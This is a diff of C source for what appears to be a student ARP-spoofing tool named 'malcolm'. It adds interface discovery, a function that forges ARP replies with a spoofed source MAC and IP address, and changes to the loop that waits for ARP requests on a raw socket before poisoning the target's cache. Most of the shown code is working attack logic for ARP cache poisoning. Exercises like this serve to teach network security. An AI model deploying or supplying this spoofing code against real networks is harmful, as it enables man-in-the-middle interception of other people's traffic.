@@ -154,8 +154,45 @@ uint8_t Fu8__init_structure_malcolm_data(struct cstc_malcolm_data *ptr_cstc_pssd
     u8_lcl_cnt = 0;
     while(u8_lcl_cnt < MAC_ADDRESS_BYTE_LEN)
         {
-        ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[u8_lcl_cnt] = 0;
-        ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[u8_lcl_cnt] = 0;
+        ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[u8_lcl_cnt]    = 0;
+        ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[u8_lcl_cnt]    = 0;
+        ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[u8_lcl_cnt] = 0;
+
+        /**
+        * Checking for overflow
+        */
+        if(u8_lcl_cnt < UINT8_MAX)
+            {
+            u8_lcl_cnt++;
+            }
+        else
+            {
+            #ifdef DEVELOPEMENT
+            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
+            #endif
+
+            #ifdef DEMO
+            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+            #endif
+
+            #ifdef PRODUCTION
+            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
+            #endif
+
+            /**
+            * Return a failure to indicate the counter variable overflow
+            */ 
+            return (RETURN_FAILURE);
+            } 
+        }
+
+    /**
+    * Setting all the character of the interface name string to NIL
+    */
+    u8_lcl_cnt = 0;
+    while(u8_lcl_cnt < MAX_INTERFACE_NAME_LEN)
+        {
+        ptr_cstc_pssd_malcolm_data->u8_interface_name_str_[u8_lcl_cnt] = NIL;
 
         /**
         * Checking for overflow
@@ -414,8 +451,45 @@ uint8_t Fu8__close_structure_malcolm_data(struct cstc_malcolm_data *ptr_cstc_pss
     u8_lcl_cnt = 0;
     while(u8_lcl_cnt < MAC_ADDRESS_BYTE_LEN)
         {
-        ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[u8_lcl_cnt] = 0;
-        ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[u8_lcl_cnt] = 0;
+        ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[u8_lcl_cnt]    = 0;
+        ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[u8_lcl_cnt]    = 0;
+        ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[u8_lcl_cnt] = 0;
+
+        /**
+        * Checking for overflow
+        */
+        if(u8_lcl_cnt < UINT8_MAX)
+            {
+            u8_lcl_cnt++;
+            }
+        else
+            {
+            #ifdef DEVELOPEMENT
+            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
+            #endif
+
+            #ifdef DEMO
+            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+            #endif
+
+            #ifdef PRODUCTION
+            ft_fprintf(STDERR_FILENO, "\033[1;31mERROR\033[0m\n");
+            #endif
+
+            /**
+            * Return a failure to indicate the counter variable overflow
+            */ 
+            return (RETURN_FAILURE);
+            } 
+        }
+
+    /**
+    * Setting all the character of the interface name string to NIL
+    */
+    u8_lcl_cnt = 0;
+    while(u8_lcl_cnt < MAX_INTERFACE_NAME_LEN)
+        {
+        ptr_cstc_pssd_malcolm_data->u8_interface_name_str_[u8_lcl_cnt] = NIL;
 
         /**
         * Checking for overflow
@@ -726,15 +800,23 @@ void Fv__display_structure_malcolm_data(struct cstc_malcolm_data *ptr_cstc_pssd_
 
     ft_printf("\n");
 
-    ft_printf("SOURCE IP ADDRESS : %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[3]);
+    ft_printf("SOURCE IP ADDRESS    : %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[3]);
 
-    ft_printf("SOURCE MAC ADDRESS: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[5]);
+    ft_printf("SOURCE MAC ADDRESS   : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_[5]);
 
     ft_printf("\n");
 
-    ft_printf("TARGET IP ADDRESS : %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[3]);
+    ft_printf("TARGET IP ADDRESS    : %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[3]);
 
-    ft_printf("TARGET MAC ADDRESS: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[5]);
+    ft_printf("TARGET MAC ADDRESS   : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_[5]);
+
+    ft_printf("\n");
+
+    ft_printf("INTERFACE MAC ADDRESS: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[0], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[1], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[2], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[3], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[4], ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_[5]);
+
+    ft_printf("INTERFACE NAME       : [%s]\n", ptr_cstc_pssd_malcolm_data->u8_interface_name_str_);
+
+    ft_printf("\n");
 
     ft_printf("SOCKET: %d\n", ptr_cstc_pssd_malcolm_data->s32_socket_);
 
@@ -1580,6 +1662,8 @@ void Fv__close_all_data_and_exit(int signal __attribute__((unused)))
         */
         }
 
+    (void) Fv__display_structure_malcolm_data(ptr_cstc_gbl_malcolm_data);
+
     /**
     * Check if the global structure malcolm data is initialized
     */
@@ -1941,6 +2025,438 @@ uint8_t Fu8__get_value_from_argument_data(struct cstc_malcolm_data *ptr_cstc_pss
     return (RETURN_SUCCESS);
     }
 
+uint8_t Fu8__forge_arp_respond(struct ether_arp *ptr_estc_pssd_ether_arp, struct ether_header *ptr_estc_pssd_ether_header, struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
+    {
+    /**
+    * Assertion of argument
+    */
+
+    /**
+    * Check if the address to the ether arp header packet part is correctly pointing passed as an argument of the function
+    */
+    if(ptr_estc_pssd_ether_arp == NULL)
+        {
+        /**
+        * Treat the case when the address to the ether arp header packet part is not correctly pointing passed as an argument of the function
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the address to the ether arp header packet part is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the address to the ether arp header packet part is not correctly pointing passed as an argument of the function
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the address to the ether arp header packet part is correctly pointing passed as an argument of the function
+        */
+        } 
+
+    /**
+    * Check if the address to the ether header packet part is correctly pointing passed as an argument of the function
+    */
+    if(ptr_estc_pssd_ether_header == NULL)
+        {
+        /**
+        * Treat the case when the address to the ether header packet part is not correctly pointing passed as an argument of the function
+        */
+
+    #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the address to the ether header packet part is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
+    #endif
+
+    #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+    #endif
+
+    #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+    #endif
+
+        /**
+        * Return failure to indicate the address to the ether header packet part is not correctly pointing passed as an argument of the function
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the address to the ether header packet part is correctly pointing passed as an argument of the function
+        */
+        } 
+
+    /**
+    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
+    */
+    if(ptr_cstc_pssd_malcolm_data == NULL)
+        {
+        /**
+        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
+        */
+        }
+
+    /**
+    * Check if the structure malcolm data is not initialized
+    */
+    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
+        {
+        /**
+        * Treat the case when the structure malcolm data is not initialized
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the structure malcolm data is not initialized
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the structure malcolm data is initialized as expected
+        */
+        }
+
+    /**
+    * Setting the mac address of the local interface network to the source mac address of the ether header in packet
+    */
+    (void) ft_memcpy(ptr_estc_pssd_ether_header->ether_shost, ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_, MAC_ADDRESS_BYTE_LEN);
+
+    /**
+    * Setting the target mac address to the ether header destination mac address
+    */
+    (void) ft_memcpy(ptr_estc_pssd_ether_header->ether_dhost, ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_, MAC_ADDRESS_BYTE_LEN);
+
+    /**
+    * Set the type of the arp packet to reply
+    */
+    ptr_estc_pssd_ether_arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
+
+    /**
+    * Setting the fake source mac address with the source address to the arp packet
+    */
+    (void) ft_memcpy(ptr_estc_pssd_ether_arp->arp_sha, ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_, MAC_ADDRESS_BYTE_LEN);
+    (*((uint32_t *) ptr_estc_pssd_ether_arp->arp_spa)) = *((uint32_t *) ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_);
+
+    /**
+    * Setting the target mac address with the target address to the arp packet
+    */
+    (void) ft_memcpy(ptr_estc_pssd_ether_arp->arp_tha, ptr_cstc_pssd_malcolm_data->u8_target_mac_addr_, MAC_ADDRESS_BYTE_LEN);
+    (*((uint32_t *) ptr_estc_pssd_ether_arp->arp_tpa)) = (*(uint32_t *) ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_);
+
+    return (RETURN_SUCCESS);
+    }
+
+uint8_t Fu8__get_valid_interface(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
+    {
+    /**
+    * Assertion of argument
+    */
+
+    /**
+    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
+    */
+    if(ptr_cstc_pssd_malcolm_data == NULL)
+        {
+        /**
+        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
+        */
+        }
+
+    /**
+    * Check if the structure malcolm data is not initialized
+    */
+    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
+        {
+        /**
+        * Treat the case when the structure malcolm data is not initialized
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the structure malcolm data is not initialized
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the structure malcolm data is initialized as expected
+        */
+        }
+
+    /**
+    * Check if the socket in the structure malcolm data is not valid
+    */
+    if(ptr_cstc_pssd_malcolm_data->s32_socket_ < 0)
+        {
+        /**
+        * Treat the case when the socket in the structure malcolm data is not valid
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the socket in the structure malcolm data is not valid\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the socket in the structure malcolm data is not valid
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the socket in the structure malcolm data is valid
+        */
+        } 
+
+
+    /**
+    * Creation of local variable
+    */
+    struct ifreq    estc_lcl_ifr;
+    int32_t         s32_lcl_return_from_function;
+    struct ifaddrs *ptr_estc_lcl_actual_network_interfaces;
+    struct ifaddrs *ptr_estc_lcl_network_interfaces;
+
+    /**
+    * Initialization of local variable
+    */
+    ptr_estc_lcl_actual_network_interfaces = NULL;
+    ptr_estc_lcl_network_interfaces        = NULL;
+    s32_lcl_return_from_function           = -1;
+
+    ft_memset(&estc_lcl_ifr, 0, sizeof(estc_lcl_ifr));
+
+    /**
+    * Getting all the network interface of the local system
+    */
+    s32_lcl_return_from_function = -1;
+    s32_lcl_return_from_function = getifaddrs(&ptr_estc_lcl_network_interfaces);
+
+    /**
+    * Check if function to get all the network interface of the local system succeeded
+    */
+    if(s32_lcl_return_from_function < 0)
+        {
+        /**
+        * Treat the case when the function to get all the network interface of the local system failed
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get all the network interface of the local system  failed\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the function to get all the network interface of the local system failed
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when function to get all the network interface of the local system succeeded
+        */
+        }
+
+    ptr_estc_lcl_actual_network_interfaces = ptr_estc_lcl_network_interfaces;
+    while(ptr_estc_lcl_actual_network_interfaces != NULL)
+        {
+        if((ptr_estc_lcl_actual_network_interfaces->ifa_addr->sa_family == AF_PACKET) && (ptr_estc_lcl_actual_network_interfaces->ifa_name != NULL) && (ptr_estc_lcl_actual_network_interfaces->ifa_addr != NULL) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_UP) != FALSE) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_BROADCAST) != FALSE) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_RUNNING) != FALSE))
+            {
+            ft_printf("Found available interface: %s\n", ptr_estc_lcl_actual_network_interfaces->ifa_name);
+
+            /**
+            * Getting the name of the actual local Network interface
+            */
+            (void) ft_strncpy((char *) ptr_cstc_pssd_malcolm_data->u8_interface_name_str_, ptr_estc_lcl_actual_network_interfaces->ifa_name, MAX_INTERFACE_NAME_LEN);
+            ptr_cstc_pssd_malcolm_data->u8_interface_name_str_[MAX_INTERFACE_NAME_LEN - 1] = NIL;
+
+            /**
+            * Getting the mac address of the actual local Network interface
+            */
+            (void) ft_memcpy(ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_, (uint8_t *)(((struct sockaddr_ll *) ptr_estc_lcl_actual_network_interfaces->ifa_addr)->sll_addr), MAC_ADDRESS_BYTE_LEN);
+
+            (void) ft_strcpy(estc_lcl_ifr.ifr_name, ptr_estc_lcl_actual_network_interfaces->ifa_name);
+
+            /**
+            * Setting the socket to the found available interface
+            */
+            s32_lcl_return_from_function = -1;
+            s32_lcl_return_from_function = setsockopt(ptr_cstc_pssd_malcolm_data->s32_socket_, SOL_SOCKET, SO_BINDTODEVICE, (void *) &estc_lcl_ifr, sizeof(estc_lcl_ifr));
+
+            /**
+            * Check if function to set the socket to the found available interface succeeded
+            */
+            if(s32_lcl_return_from_function < 0)
+                {
+                /**
+                * Treat the case when the function to set the socket to the found available interface failed
+                */
+
+                #ifdef DEVELOPEMENT
+                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to set the socket to the found available interface  failed\n", __FILE__, __func__, __LINE__);
+                #endif
+
+                #ifdef DEMO
+                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+                #endif
+
+                #ifdef PRODUCTION
+                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+                #endif
+
+                /**
+                * Freeing the linked list of network interface of the local system
+                */
+                (void) freeifaddrs(ptr_estc_lcl_network_interfaces);
+
+                /**
+                * Return failure to indicate the function to set the socket to the found available interface failed
+                */
+                return (RETURN_FAILURE);
+                }
+            else
+                {
+                /**
+                * Treat the case when function to set the socket to the found available interface succeeded
+                */
+                } 
+
+            /**
+            * Freeing the linked list of network interface of the local system
+            */
+            (void) freeifaddrs(ptr_estc_lcl_network_interfaces);
+
+            return (RETURN_SUCCESS);
+            }
+
+        ptr_estc_lcl_actual_network_interfaces = ptr_estc_lcl_actual_network_interfaces->ifa_next;
+        }
+
+    /**
+    * Freeing the linked list of network interface of the local system
+    */
+    (void) freeifaddrs(ptr_estc_lcl_network_interfaces);
+
+    /**
+    * Treat the case when no available interface found
+    */
+
+    #ifdef DEVELOPEMENT
+    fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    no available interface found\n", __FILE__, __func__, __LINE__);
+    #endif
+
+    #ifdef DEMO
+    fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+    #endif
+
+    #ifdef PRODUCTION
+    fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+    #endif
+
+    /**
+    * Return failure to indicate no available interface found
+    */
+    return (RETURN_FAILURE);
+    }
+
 uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
     {
     /**
@@ -2049,24 +2565,24 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
     /**
     * Creation of local variable
     */
-    //uint8_t u8_lcl_return_from_function;
     int32_t              s32_lcl_return_from_function;
     socklen_t            estc_lcl_length_of_socket_addr;
-    ssize_t              sszt_lcl_number_of_byte_received;
+    ssize_t              sszt_lcl_number_of_byte;
     struct ether_arp    *ptr_estc_lcl_ether_arp;
     struct ether_header *ptr_estc_lcl_ether_header;
     struct sockaddr_ll   estc_lcl_socket_addr;
     uint8_t              u8_lcl_packet[PACKET_MAX_LEN];
+    uint8_t              u8_lcl_return_from_function;
 
     /**
     * Initialization of local variable
     */
-    //u8_lcl_return_from_function = RETURN_FAILURE;
-    estc_lcl_length_of_socket_addr   = sizeof(estc_lcl_socket_addr);
-    ptr_estc_lcl_ether_arp           = NULL;
-    ptr_estc_lcl_ether_header        = NULL;
-    s32_lcl_return_from_function     = -1;
-    sszt_lcl_number_of_byte_received = 0;
+    estc_lcl_length_of_socket_addr = sizeof(estc_lcl_socket_addr);
+    ptr_estc_lcl_ether_arp         = NULL;
+    ptr_estc_lcl_ether_header      = NULL;
+    s32_lcl_return_from_function   = -1;
+    sszt_lcl_number_of_byte        = 0;
+    u8_lcl_return_from_function    = RETURN_FAILURE;
 
     /**
     * Initialize the packet value to zero
@@ -2078,6 +2594,45 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
     */
     (void) ft_bzero(&estc_lcl_socket_addr, sizeof(estc_lcl_socket_addr));
 
+    /**
+    * Getting a valid interface
+    */
+    u8_lcl_return_from_function = RETURN_FAILURE;
+    u8_lcl_return_from_function = Fu8__get_valid_interface(ptr_cstc_pssd_malcolm_data);
+
+    /**
+    * Check if function to get a valid interface succeeded
+    */
+    if(u8_lcl_return_from_function != RETURN_SUCCESS)
+        {
+        /**
+        * Treat the case when the function to get a valid interface failed
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get a valid interface  failed\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the function to get a valid interface failed
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when function to get a valid interface succeeded
+        */
+        }
+
     ft_printf("Waiting for ARP request ...\n\n");
 
     /**
@@ -2088,13 +2643,13 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         /**
         * Receving a packet from the socket in the structure malcolm data
         */
-        sszt_lcl_number_of_byte_received = -1;
-        sszt_lcl_number_of_byte_received = recvfrom(ptr_cstc_pssd_malcolm_data->s32_socket_, u8_lcl_packet, PACKET_MAX_LEN, 0, (struct sockaddr *) &estc_lcl_socket_addr, &estc_lcl_length_of_socket_addr);
+        sszt_lcl_number_of_byte = -1;
+        sszt_lcl_number_of_byte = recvfrom(ptr_cstc_pssd_malcolm_data->s32_socket_, u8_lcl_packet, PACKET_MAX_LEN, 0, (struct sockaddr *) &estc_lcl_socket_addr, &estc_lcl_length_of_socket_addr);
 
         /**
         * Check if function to receve a packet from the socket in the structure malcolm data succeeded
         */
-        if(sszt_lcl_number_of_byte_received < 0)
+        if(sszt_lcl_number_of_byte < 0)
             {
             /**
             * Treat the case when the function to receve a packet from the socket in the structure malcolm data failed
@@ -2127,7 +2682,7 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         /**
         * Check if the socket in the structure malcolm data is orderly shutdown
         */
-        if(sszt_lcl_number_of_byte_received == 0)
+        if(sszt_lcl_number_of_byte == 0)
             {
             /**
             * Treat the case when the socket in the structure malcolm data is orderly shutdown
@@ -2219,7 +2774,7 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         /**
         * Check if the packet receve is bigger or equals than an ARP packet
         */
-        if((size_t) sszt_lcl_number_of_byte_received >= (sizeof(struct ether_header) + sizeof(struct ether_arp)))
+        if((size_t) sszt_lcl_number_of_byte >= (sizeof(struct ether_header) + sizeof(struct ether_arp)))
             {
             /**
             * Treat the case when the packet receve is bigger or equals than an ARP packet
@@ -2228,6 +2783,8 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
             ptr_estc_lcl_ether_header = (struct ether_header *) u8_lcl_packet;
             ptr_estc_lcl_ether_arp    = (struct ether_arp *) (u8_lcl_packet + sizeof(struct ether_header));
 
+            if(ntohs(ptr_estc_lcl_ether_header->ether_type) == ETH_P_ARP)
+                printf("ARP %s from %d.%d.%d.%d for %d.%d.%d.%d\n", (ntohs(ptr_estc_lcl_ether_arp->ea_hdr.ar_op) == ARPOP_REQUEST) ? "REQUEST" : "RESPOND", ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[0], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[1], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[2], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_spa)[3], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[0], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[1], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[2], ((uint8_t *)ptr_estc_lcl_ether_arp->arp_tpa)[3]);
             /**
             * Check if the actual packet receve is an arp request packet from the source ip passed in the first argument of the program to the target ip passed in the third argument of the program
             */
@@ -2258,6 +2815,88 @@ uint8_t Fu8__make_arp_poisoning(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_
         }
 
